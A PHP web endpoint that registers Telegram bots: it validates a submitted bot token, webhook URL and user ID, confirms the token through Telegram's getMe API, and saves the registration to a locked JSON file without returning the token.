
<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('log_errors', '1');

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

function respond($data, $code = 200) {
    http_response_code($code);
    echo json_encode(
        $data,
        JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE
    );
    exit;
}

if (!in_array($_SERVER['REQUEST_METHOD'], ['GET', 'POST'], true)) {
    respond(['ok' => false, 'msg' => 'GET or POST required']);
}

/* Read POST form fields, JSON body, or legacy GET fields */
$input = $_POST;

if (empty($input) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw = file_get_contents('php://input');
    $jsonInput = json_decode($raw, true);

    if (is_array($jsonInput)) {
        $input = $jsonInput;
    }
}

function getValue($key, $input) {
    if (isset($input[$key])) {
        return trim((string)$input[$key]);
    }

    if (isset($_GET[$key])) {
        return trim((string)$_GET[$key]);
    }

    return '';
}

$botHash = getValue('botHash', $input);
$botUsername = getValue('bot', $input);
$botToken = getValue('bot_token', $input);
$webhookUrl = getValue('webhook_url', $input);
$userId = getValue('user_id', $input);

/* Data directory */
$dataDir = __DIR__ . '/data';

if (!is_dir($dataDir) && !@mkdir($dataDir, 0750, true) && !is_dir($dataDir)) {
    respond(['ok' => false, 'msg' => 'Cannot create data directory']);
}

$botsFile = $dataDir . '/bots.json';

/* Validate registration hash */
if (!preg_match('/^[a-zA-Z0-9]{20,100}$/', $botHash)) {
    respond(['ok' => false, 'msg' => 'Invalid or missing botHash']);
}

/* Validate Telegram user ID */
if ($userId === '' || !ctype_digit($userId)) {
    respond(['ok' => false, 'msg' => 'Invalid Telegram user ID']);
}

/* Validate token format without revealing it */
if (!preg_match('/^[0-9]{6,15}:[A-Za-z0-9_-]{20,}$/', $botToken)) {
    respond([
        'ok' => false,
        'msg' => 'Bot token format is invalid. Check Bot.info().token and regenerate the token if needed.'
    ]);
}

/* Validate HTTPS webhook */
if (
    !filter_var($webhookUrl, FILTER_VALIDATE_URL) ||
    strtolower((string)parse_url($webhookUrl, PHP_URL_SCHEME)) !== 'https' ||
    empty(parse_url($webhookUrl, PHP_URL_HOST))
) {
    respond(['ok' => false, 'msg' => 'Invalid HTTPS webhook URL']);
}

/* Telegram getMe validation */
function telegramGetMe($token) {
    if (!function_exists('curl_init')) {
        return [
            'ok' => false,
            'error' => 'PHP cURL extension is not enabled'
        ];
    }

    $url = 'https://api.telegram.org/bot' . $token . '/getMe';
    $ch = curl_init($url);

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_USERAGENT => 'DeviceVerification/2.1'
    ]);

    $body = curl_exec($ch);
    $httpCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);

    curl_close($ch);

    if ($body === false) {
        return [
            'ok' => false,
            'error' => 'Connection to Telegram failed: ' . $curlError
        ];
    }

    $data = json_decode($body, true);

    if (!is_array($data)) {
        return [
            'ok' => false,
            'error' => 'Telegram returned invalid JSON. HTTP ' . $httpCode
        ];
    }

    if ($httpCode !== 200 || empty($data['ok'])) {
        $description = $data['description'] ?? 'Unknown Telegram API error';

        return [
            'ok' => false,
            'error' => 'Telegram API HTTP ' . $httpCode . ': ' . $description
        ];
    }

    return $data;
}

$telegram = telegramGetMe($botToken);

if (empty($telegram['ok'])) {
    error_log('Device verification getMe failed: ' . ($telegram['error'] ?? 'Unknown'));

    respond([
        'ok' => false,
        'msg' => 'Telegram bot token verification failed',
        'details' => $telegram['error'] ?? 'Unknown Telegram error'
    ]);
}

$telegramBot = $telegram['result'] ?? [];

$actualBotId = (string)($telegramBot['id'] ?? '');
$actualUsername = ltrim((string)($telegramBot['username'] ?? ''), '@');

if ($actualBotId === '' || $actualUsername === '') {
    respond(['ok' => false, 'msg' => 'Telegram did not return valid bot details']);
}

/* Check supplied username against actual bot */
if (
    $botUsername !== '' &&
    strtolower(ltrim($botUsername, '@')) !== strtolower($actualUsername)
) {
    respond([
        'ok' => false,
        'msg' => 'Bot username does not match the supplied bot token',
        'actual_bot' => '@' . $actualUsername
    ]);
}

/* Atomic database update */
$fp = @fopen($botsFile, 'c+');

if (!$fp) {
    respond(['ok' => false, 'msg' => 'Cannot open bots database']);
}

if (!flock($fp, LOCK_EX)) {
    fclose($fp);
    respond(['ok' => false, 'msg' => 'Cannot lock bots database']);
}

rewind($fp);
$content = stream_get_contents($fp);

if ($content === false || trim($content) === '') {
    $bots = [];
} else {
    $bots = json_decode($content, true);

    if (!is_array($bots)) {
        flock($fp, LOCK_UN);
        fclose($fp);
        respond(['ok' => false, 'msg' => 'bots.json contains invalid JSON']);
    }
}

/* Find this bot + owner registration */
$foundIndex = -1;

foreach ($bots as $index => $bot) {
    if (
        is_array($bot) &&
        (string)($bot['telegram_bot_id'] ?? '') === $actualBotId &&
        (string)($bot['telegram_user_id'] ?? '') === $userId
    ) {
        $foundIndex = $index;
        break;
    }
}

$now = date('Y-m-d H:i:s');

try {
    if ($foundIndex >= 0) {
        $registrationId = $bots[$foundIndex]['id'] ?? bin2hex(random_bytes(8));

        $bots[$foundIndex]['id'] = $registrationId;
        $bots[$foundIndex]['random_id'] = $registrationId;
        $bots[$foundIndex]['bot_hash'] = $botHash;
        $bots[$foundIndex]['bot_username'] = '@' . $actualUsername;
        $bots[$foundIndex]['bot_username_clean'] = $actualUsername;
        $bots[$foundIndex]['bot_token'] = $botToken;
        $bots[$foundIndex]['webhook_url'] = $webhookUrl;
        $bots[$foundIndex]['telegram_bot_id'] = $actualBotId;
        $bots[$foundIndex]['telegram_user_id'] = $userId;
        $bots[$foundIndex]['status'] = 'active';
        $bots[$foundIndex]['last_activity'] = $now;
    } else {
        $registrationId = bin2hex(random_bytes(8));

        $bots[] = [
            'id' => $registrationId,
            'random_id' => $registrationId,
            'bot_hash' => $botHash,
            'bot_username' => '@' . $actualUsername,
            'bot_username_clean' => $actualUsername,
            'bot_token' => $botToken,
            'webhook_url' => $webhookUrl,
            'telegram_bot_id' => $actualBotId,
            'telegram_user_id' => $userId,
            'status' => 'active',
            'created_at' => $now,
            'last_activity' => $now
        ];
    }
} catch (Throwable $e) {
    flock($fp, LOCK_UN);
    fclose($fp);
    respond(['ok' => false, 'msg' => 'Could not prepare registration record']);
}

$json = json_encode(
    $bots,
    JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE
);

if ($json === false) {
    flock($fp, LOCK_UN);
    fclose($fp);
    respond(['ok' => false, 'msg' => 'Could not encode bots database']);
}

rewind($fp);

if (!ftruncate($fp, 0)) {
    flock($fp, LOCK_UN);
    fclose($fp);
    respond(['ok' => false, 'msg' => 'Could not clear bots database for update']);
}

$written = fwrite($fp, $json);
fflush($fp);

flock($fp, LOCK_UN);
fclose($fp);

if ($written === false || $written !== strlen($json)) {
    respond(['ok' => false, 'msg' => 'Could not completely save bot registration']);
}

/* Success response: never return the bot token */
respond([
    'ok' => true,
    'msg' => 'Bot registration saved successfully',
    'id' => $registrationId,
    'bot_id' => $actualBotId,
    'user_id' => $userId,
    'bot' => '@' . $actualUsername
]);
